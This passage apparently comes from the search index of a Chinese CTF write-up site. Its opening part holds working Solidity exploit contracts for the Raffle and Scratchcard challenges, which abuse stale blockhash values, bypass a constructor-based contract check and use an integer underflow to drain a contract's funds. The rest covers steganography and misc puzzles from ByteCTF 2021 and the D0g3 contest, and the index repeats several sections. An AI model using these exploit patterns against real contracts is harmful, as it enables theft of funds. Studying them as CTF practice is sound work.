public payable ctf { if ( msg.value >= fee ){ this . buyTicket (); } else if ( msg.value == 0 ){ this . closeRaffle (); } else { this . collectReward (); } } } \u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0 \u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86 \u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570 exp contract Exploit { Raffle challenge ; constructor ( address addr ) public { challenge = Raffle ( addr ); } function buyTicket () public payable { challenge . buyTicket . value ( msg.value )(); } function exp () public { address ( challenge ). call . value ( 0 ether )(); challenge . collectReward (); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Raffle"},{"location":"writeups/SecurityInnovation/#scratchcard","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; library Address { function isContract ( address account ) internal view returns ( bool ) { uint256 size ; assembly { size : = extcodesize ( account ) } return size > 0 ; } } contract Scratchcard is CtfFramework { event CardPurchased ( address indexed player , uint256 cost , bool winner ); mapping ( address => uint256 ) private winCount ; uint256 private cost ; using Address for address ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { } modifier notContract (){ require ( ! msg.sender . isContract (), \"Contracts Not Allowed\" ); _ ; } function play () public payable notContract ctf { bool won = false ; if (( now % 10 ** 8 ) * 10 ** 10 == msg.value ){ won = true ; winCount [ msg.sender ] += 1 ; cost = msg.value ; msg.sender . transfer ( cost ); } else { cost = 0 ; winCount [ msg.sender ] = 0 ; } emit CardPurchased ( msg.sender , msg.value , won ); } function checkIfMegaJackpotWinner () public view returns ( bool ){ return ( winCount [ msg.sender ] >= 25 ); } function collectMegaJackpot ( uint256 _amount ) public notContract ctf { require ( checkIfMegaJackpotWinner (), \"User Not Winner\" ); require ( 2 * cost - _amount > 0 , \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\" ); winCount [ msg.sender ] = 0 ; msg.sender . transfer ( _amount ); } function () public payable ctf { play (); } } \u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 2 * cost - _amount > 0 \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86 \u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6 exp contract Attacker { Scratchcard challenge ; uint public count ; uint public money ; constructor ( address addr , address player ) public payable { challenge = Scratchcard ( addr ); count = 0 ; while ( count < 25 ) { money = ( now % 10 ** 8 ) * 10 ** 10 ; challenge . play . value ( money )(); count += 1 ; } challenge . collectMegaJackpot ( addr . balance ); selfdestruct ( player ); } function () public payable {} } contract Exploit { Scratchcard challenge ; address player ; uint8 public nonce ; constructor ( address addr , address _player ) public { challenge = Scratchcard ( addr ); player = _player ; nonce = 1 ; } function exp () public payable { address attacker = address ( keccak256 ( 0xd6 , 0x94 , this , nonce )); nonce += 1 ; challenge . ctf_challenge_add_authorized_sender ( attacker ); address ( attacker ). transfer ( 4 ether ); Attacker newAttacker = new Attacker ( address ( challenge ), player ); } function () public payable {} function destroy () public { selfdestruct ( player ); } }","title":"Scratchcard"},{"location":"writeups/bytectf2021_final/","text":"ByteCTF 2021 Final Writeup \u00b6 Abstract \u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684 Enrich Life \u00b6 \u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a FlagInChromaFrames \uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf \u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38 \u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f \u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a import cv2 import numpy as np import matplotlib.pyplot as plt video = cv2 . VideoCapture ( 'enrich_life.mp4' ) n = 300 x = [ i for i in range ( n * 8 )] y = [] for i in range ( n * 8 ): _ , frame = video . read () frame = frame [:, :, :] frame = cv2 . cvtColor ( frame , cv2 . COLOR_BGR2YUV ) Y , U , V = cv2 . split ( frame ) y . append ( np . abs ( np . average ( V ))) plt . figure ( figsize = ( 64 , 16 )) plt . scatter ( x , y , s = 1 ) plt . show () print ( y ) \u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a import cv2 import numpy as np from Crypto.Util.number import * video = cv2 . VideoCapture ( 'enrich_life.mp4' ) y = np . reshape ([ np . abs ( np . average ( cv2 . split ( cv2 . cvtColor ( video . read ()[ 1 ][:,:,:], cv2 . COLOR_BGR2YUV ))[ 2 ])) for _ in range ( 150 * 8 )], ( 240 , 5 )) print ( long_to_bytes ( int ( \"\" . join ([ '1' if y [ i , 0 ] < y [ i , 1 ] else '0' for i in range ( 240 )]), 2 ))) # b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a' FPS_game \u00b6 \u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a \u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002 Lisa's cat \u00b6 \u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247 \u5728 green 0 \u4e2d\u770b\u5230\u4e0b\u56fe \u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0 \u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe \u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570 import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 1 * x + 20 * y ) % width ny = ( 21 * x + 421 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"233.bmp\" , 384 ) result . show () \u7b2c\u4e00\u5f20\u56fe\u5c31\u662f Undercover \u00b6 \u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png \u53d1\u73b0\u4e86 ~tplv- \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png \u6216 https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png \u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a Author: From: Zach Oakes \u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1a https://sekao.net/pixeljihad/ \u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a","title":"ByteCTF 2021 Final"},{"location":"writeups/bytectf2021_final/#bytectf-2021-final-writeup","text":"Abstract \u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684","title":"ByteCTF 2021 Final Writeup"},{"location":"writeups/bytectf2021_final/#enrich-life","text":"\u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a FlagInChromaFrames \uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf \u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38 \u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f \u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a import cv2 import numpy as np import matplotlib.pyplot as plt video = cv2 . VideoCapture ( 'enrich_life.mp4' ) n = 300 x = [ i for i in range ( n * 8 )] y = [] for i in range ( n * 8 ): _ , frame = video . read () frame = frame [:, :, :] frame = cv2 . cvtColor ( frame , cv2 . COLOR_BGR2YUV ) Y , U , V = cv2 . split ( frame ) y . append ( np . abs ( np . average ( V ))) plt . figure ( figsize = ( 64 , 16 )) plt . scatter ( x , y , s = 1 ) plt . show () print ( y ) \u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a import cv2 import numpy as np from Crypto.Util.number import * video = cv2 . VideoCapture ( 'enrich_life.mp4' ) y = np . reshape ([ np . abs ( np . average ( cv2 . split ( cv2 . cvtColor ( video . read ()[ 1 ][:,:,:], cv2 . COLOR_BGR2YUV ))[ 2 ])) for _ in range ( 150 * 8 )], ( 240 , 5 )) print ( long_to_bytes ( int ( \"\" . join ([ '1' if y [ i , 0 ] < y [ i , 1 ] else '0' for i in range ( 240 )]), 2 ))) # b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a'","title":"Enrich Life"},{"location":"writeups/bytectf2021_final/#fps_game","text":"\u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a \u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002","title":"FPS_game"},{"location":"writeups/bytectf2021_final/#lisas-cat","text":"\u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247 \u5728 green 0 \u4e2d\u770b\u5230\u4e0b\u56fe \u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0 \u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe \u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570 import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 1 * x + 20 * y ) % width ny = ( 21 * x + 421 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"233.bmp\" , 384 ) result . show () \u7b2c\u4e00\u5f20\u56fe\u5c31\u662f","title":"Lisa's cat"},{"location":"writeups/bytectf2021_final/#undercover","text":"\u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png \u53d1\u73b0\u4e86 ~tplv- \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png \u6216 https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png \u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a Author: From: Zach Oakes \u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1a https://sekao.net/pixeljihad/ \u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a","title":"Undercover"},{"location":"writeups/d0g3/","text":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup \u00b6 Abstract \u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup Cthulhu Mythos \u00b6 hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST \u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a MRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32 \u89e3\u7801\uff1a d_Try_Terr4ria!} \u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a \u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a 7I4YF6QLO \u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a \u7bb1\u5b50 3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32 IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32\uff1a D0g3{M1necR4ft_G0_And_Try_Terr4ria!} lovemath \u00b6 \u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula \u5148\u770b\u538b\u7f29\u5305 flag\u649eCRC\u6821\u9a8c \u5bc6\u7801: th1s_Is_Y0ur_pa33w0rd_We1c0m3e \u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247: \u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5 \u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a \u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352 D0g3{I_LOV3_math} CyzCC_loves_LOL \u00b6 \u5f00\u59cb\u662f LOLcode \uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 AGdJfpqebmXpptloa \u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f jinx's_flag_in_silent.jpg \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801 \u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a #800000FF #008000FF #000000FF #0000FFFF #FFFF00FF #00FFFFFF #FF0000FF #00FF00FF #008080FF #808000FF \u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 Brainloller\u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) -+++++++-+ [ < ++++++++ > - ] < . > +++++++ [ < ++++ > - ] < + . +++++++ .. +++ . >>> ++++++++ [ < ++++ > - ] < . >>> ++++++++++ [ < ++++-++++ > - ] < --- . <<<< . +++ . -+---- . -------- . >> + . \u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell \u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a > \uff09 \u5f97\u5230\u5bc6\u7801\uff1a 0MTTW_CWZVN! \u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}","title":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d"},{"location":"writeups/d0g3/#writeup","text":"Abstract \u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup","title":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup"},{"location":"writeups/d0g3/#cthulhu-mythos","text":"hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST \u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a MRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32 \u89e3\u7801\uff1a d_Try_Terr4ria!} \u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a \u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a 7I4YF6QLO \u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a \u7bb1\u5b50 